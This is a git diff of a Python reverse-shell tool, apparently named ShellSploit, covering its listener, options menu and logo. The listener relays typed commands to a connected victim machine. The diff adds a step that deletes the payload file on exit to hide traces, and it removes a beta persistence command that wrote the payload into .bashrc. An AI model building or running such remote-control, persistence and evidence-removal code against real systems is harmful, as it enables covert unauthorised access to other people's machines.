@@ -11,12 +11,13 @@ legal_warning = Fore.RED + """
 * and civil penalties.                                     *
 ************************************************************
 """
-
+# Listiner
 def listen(ip, port):
     try:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.bind((ip, port))
         server.listen(1)
+        payload_name = input("What is the name of your payload (Without .py): ")
         print(f"Listening on {ip}:{port}")
     except OSError as e:
         print(f"[!] Failed to start listener: {e}")
@@ -33,13 +34,12 @@ def listen(ip, port):
         while True:
             command = input("Shell> ")
             if command.lower() == "exit":
+                hide = "rm {payload_name}.py"
+                client_socket.send(hide.encode())
                 break
-            elif command.lower() == "persistant":                         # BETA
-                persistant = r""""echo "python payload.py" > .bashrc """  # BETA
-                client_socket.send(persistant.encode())                   # BETA
 
             client_socket.send(command.encode())
-            response = client_socket.recv(4096).decode()
+            response = client_socket.recv(6000).decode()
             print(response)
     except Exception as e:
         print(f"[!] Error: {e}")
@@ -48,6 +48,7 @@ def listen(ip, port):
         server.close()
         print("[*] Listener closed.")
 
+# Used to check what the user chose
 def option_check(choice):
     if choice == "1":
         shell_type = input("Enter shell type (bash, python): ").lower()
@@ -96,11 +97,15 @@ if __name__ == "__main__":
     else:
         print("[!] Invalid option.")
 
+# Options menu
+
 options_menu = Fore.GREEN + """
 Options:
 1. Reverse Shell Generator
 2. Listener
 """
+
+# Logo
 logo = Fore.MAGENTA + r"""
   ██████  ██░ ██ ▓█████  ██▓     ██▓      ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓  
 ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
@@ -117,7 +122,7 @@ logo = Fore.MAGENTA + r"""
 ▐▌  ▐▌█▀▀▀ 
  ▝▚▞▘ █▄▄▄ 
 """
-
+# Main UI
 username = getpass.getuser()
 print(logo)
 print("- Made By GdevMan\n- My GH -> https://github.com/GdevMan")
